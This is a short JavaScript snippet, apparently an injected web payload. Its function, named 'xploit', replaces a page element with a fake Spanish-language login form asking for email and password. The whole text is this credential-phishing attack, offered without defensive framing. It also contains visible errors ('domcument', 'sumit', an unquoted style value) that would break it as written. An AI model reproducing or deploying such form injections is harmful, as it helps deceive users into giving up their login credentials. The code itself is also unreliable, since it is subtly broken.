var form = domcument.getElementById("id02");
function xploit(){
  alert("Cargando xploit...");
  form.innerHTML = '<div class="modal-content animate"><div class="imgcontainer"><span onclick="inicioSesion.getDOM().style.display=none" class="close" title="Cerrar">×</span></div><form class="container" id="form_id02" method="GET" action="google.es"><h2>INICIAR SESIÓN</h2><p>Introduce tu correo y contraseña</p><input id="correo_id02" type="text" placeholder="Correo electrónico" name="correo" required=""><input id="con_id02" type="password" placeholder="Contraseña" name="con" required=""><p id="err1_id02" class="error" style="display: none;">El usuario y la contraseña no coinciden</p><div style="text-align: center;"><button id="submit_id02" type="sumit">Iniciar sesión</button><br><a href="#" style="text-decoration:none;" class="psw">¿Has olvidado tu contraseña?</a></div></form><div style="text-align: center;"><p class="link">¿Aún no tienes cuenta?<br><a href="#" >Regístrate</a></p></div></div>';
  alert("Cargado!");
}
xploit();
